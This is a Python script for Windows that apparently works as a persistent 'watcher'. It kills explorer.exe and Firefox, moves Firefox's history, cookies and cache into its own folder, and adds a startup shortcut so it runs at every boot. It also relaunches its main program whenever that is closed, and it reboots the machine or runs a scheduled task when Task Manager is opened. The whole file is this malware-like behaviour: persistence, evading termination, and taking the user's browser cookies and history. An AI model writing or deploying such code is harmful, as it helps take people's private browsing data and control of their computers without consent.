import os
import subprocess
from win32com.client import Dispatch
from shutil import move
import psutil
import signal

# Writing PID to file
pid = os.getpid()

with open("pid.txt", "w") as file:
    file.write(str(pid))
file.close()

# Killing explorer.exe
with subprocess.Popen("taskkill /IM explorer.exe /F", shell=True) as process_term:  # Killing explorer.exe
    pass


if os.path.exists(os.path.join(os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"), "watcher.lnk")):
        # Killing firefox.exe
    try:
        proc = subprocess.Popen("taskkill /IM firefox.exe /F", shell=True)
    except Exception:
        print("There's no process \"firefox.exe\"")

    while proc.poll() == None:
        pass

        # Moving history, cookies and cache to program's directory
    try:
        path_to_firefox_roaming = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
        path_to_firefox_local = os.path.expanduser(r"~\AppData\Local\Mozilla\Firefox\Profiles")
        firefox_dir = os.listdir(path_to_firefox_roaming)
        for i in firefox_dir:
            if i.endswith(".default-release"):
                randstr = i
                break
        path_to_history_after = os.path.join(randstr, "places.sqlite")
        path_to_history = os.path.join(path_to_firefox_roaming, path_to_history_after)
        path_to_cookies_after = os.path.join(randstr, "cookies.sqlite")
        path_to_cookies = os.path.join(path_to_firefox_roaming, path_to_cookies_after)
        path_to_cache_after = os.path.join(randstr, "cache2")
        path_to_cache = os.path.join(path_to_firefox_local, path_to_cache_after)
        move(path_to_history, os.path.dirname(os.path.realpath(__file__)))
        move(path_to_cookies, os.path.dirname(os.path.realpath(__file__)))
        move(path_to_cache, os.path.dirname(os.path.realpath(__file__)))
        with open("path.txt", "w") as file:
            file.write(str(path_to_history) + "\n")
            file.write(str(path_to_cookies) + "\n")
            file.write(str(path_to_cache) + "\n")
        file.close()
    except FileNotFoundError:
        print("File hasn't been found")
else:
    print("There's no file")

# Creating a file that will launch when computer turns on
path = os.path.join(os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"), "watcher.lnk")
target = os.path.join(os.path.dirname(os.path.realpath(__file__)), "watcher.exe")
wdir = os.path.dirname(os.path.realpath(__file__))
icon = os.path.join(os.path.dirname(os.path.realpath(__file__)), "watcher.exe")

shell = Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wdir
shortcut.IconLocation = icon
shortcut.save()

# Starting main file
main = subprocess.Popen("main.exe", shell=True)

t = 0

path_to_settings = os.path.join(os.path.dirname(os.path.dirname(os.path.realpath(__file__))), "settings.txt")

with open(path_to_settings, "r") as file:
    r = file.read()

try:
    r = int(r)
except Exception:
    proc_kill = subprocess.Popen("taskkill /IM main.exe /F", shell=True)
    while proc_kill.poll() == None:
        pass
    pid = os.getpid()
    os.kill(pid, signal.SIGTERM)


# Watching main program to not be closed and Taskmgr.exe process to not be running
while True:
    if main.poll() == None:
        pass
    else:
        main = subprocess.Popen("main.exe", shell=True)
    for proc in psutil.process_iter():
        with proc.oneshot():
            name = proc.name()
            if name == "Taskmgr.exe":
                if t != 1:
                    if r == 0:
                        print("Hmmmm")
                        subprocess.Popen("C:\Windows\System32\schtasks.exe /run /tn \"Term\"", shell=True)
                    if r == 1:
                        subprocess.Popen("shutdown -r", shell=True)
                    t = 1
                break
    else:
        t = 0
